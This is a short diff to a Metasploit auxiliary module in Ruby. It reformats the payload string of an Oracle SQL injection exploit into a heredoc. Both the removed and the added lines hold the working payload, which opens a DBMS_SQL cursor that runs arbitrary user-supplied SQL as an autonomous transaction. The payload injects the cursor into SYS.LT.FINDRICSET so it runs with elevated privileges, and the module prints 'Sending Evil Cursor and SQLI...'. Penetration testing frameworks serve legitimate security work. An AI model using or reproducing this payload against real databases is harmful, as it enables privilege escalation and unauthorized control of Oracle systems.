@@ -49,14 +49,15 @@ class Metasploit3 < Msf::Auxiliary
 
 		p     = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
 
-		cursor = "
-			DECLARE
-			#{p} NUMBER;
-			BEGIN
-  			#{p} := DBMS_SQL.OPEN_CURSOR;
-  			DBMS_SQL.PARSE(#{p},'declare pragma autonomous_transaction; begin execute immediate 				''#{datastore['SQL'].upcase}'';commit;end;',0);
-			SYS.LT.FINDRICSET('.''||dbms_sql.execute('||#{p}||')||'''')--','');
-			END;"
+		cursor = <<-EOF
+DECLARE
+#{p} NUMBER;
+BEGIN
+#{p} := DBMS_SQL.OPEN_CURSOR;
+DBMS_SQL.PARSE(#{p},'declare pragma autonomous_transaction; begin execute immediate 				''#{datastore['SQL'].upcase}'';commit;end;',0);
+SYS.LT.FINDRICSET('.''||dbms_sql.execute('||#{p}||')||'''')--','');
+END;
+EOF
 
 		begin
 			print_status("Sending Evil Cursor and SQLI...")
